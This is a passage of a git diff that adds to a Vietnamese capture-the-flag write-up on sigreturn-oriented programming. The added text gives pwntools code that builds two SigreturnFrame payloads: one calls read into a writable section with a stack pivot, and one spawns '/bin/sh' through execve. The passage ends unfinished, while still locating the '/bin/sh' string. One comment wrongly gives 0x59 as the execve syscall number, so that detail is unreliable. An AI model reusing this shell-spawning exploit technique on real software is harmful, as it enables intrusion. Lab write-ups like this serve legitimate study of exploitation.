@@ -25,3 +25,56 @@ Trong các gadget chỉ có `pop rax` và `syscall` chứ không có các gadget
 <img width="1016" height="202" alt="image" src="https://github.com/user-attachments/assets/65f08509-fea5-42bc-959b-804a150edd7e" />
 
 `rt_sigreturn` là lệnh syscall sẽ lấy dữ liệu trên Stack để ghi đè vào các thanh ghi. 
+
+Điều khiển cấu trúc thanh ghi để gọi lệnh read:
+
+    rw_section=0x404320 
+    pop_rax_syscall=0x0000000000401156
+    syscall=0x0000000000401157
+    
+    frame=SigreturnFrame()    //frame nạp cấu trúc thanh ghi trên Stack
+    frame.rax=0
+    frame.rdi=0
+    frame.rsi=rw_section
+    frame.rdx=0x400
+    frame.rsp=rw_section      //stack pivot nhảy đến vùng rw
+    frame.rip=syscall
+    
+    payload=b'A'*0x18
+    payload+=flat(
+    	pop_rax_syscall,
+    	0x0f,
+    	bytes(frame)
+    	)
+    
+    p.send(payload)
+
+Cần 1 nơi để chứa `/bin/sh` nên cần gọi read trước rồi thiết lập execve.
+
+<img width="890" height="562" alt="image" src="https://github.com/user-attachments/assets/79cf323c-fc9d-42e0-89bd-d408be8c540a" />
+
+Các thanh ghi đã được thiết lập đúng như frame chúng ta nhập vào, đã đủ gọi read để nhập payload tiếp theo.
+
+    frame=SigreturnFrame()
+    frame.rax=0x59            //mã gọi execve
+    frame.rdi=rw_section      //chưa biết địa chỉ /bin/sh ở đâu
+    frame.rsi=0
+    frame.rdx=0
+    frame.rsp=rw_section
+    frame.rip=syscall
+    
+    payload=flat(
+    	pop_rax_syscall,
+    	0x0f,
+    	bytes(frame),
+    	b'/bin/sh'
+    	)
+    
+    input()
+    p.send(payload)
+
+<img width="754" height="410" alt="image" src="https://github.com/user-attachments/assets/6dcdc984-ae4a-4dd7-aa38-1aa63a898e5f" />
+
+Chạy thử để tìm xem `/bin/sh` nằm ở đâu trong Stack.
+
+
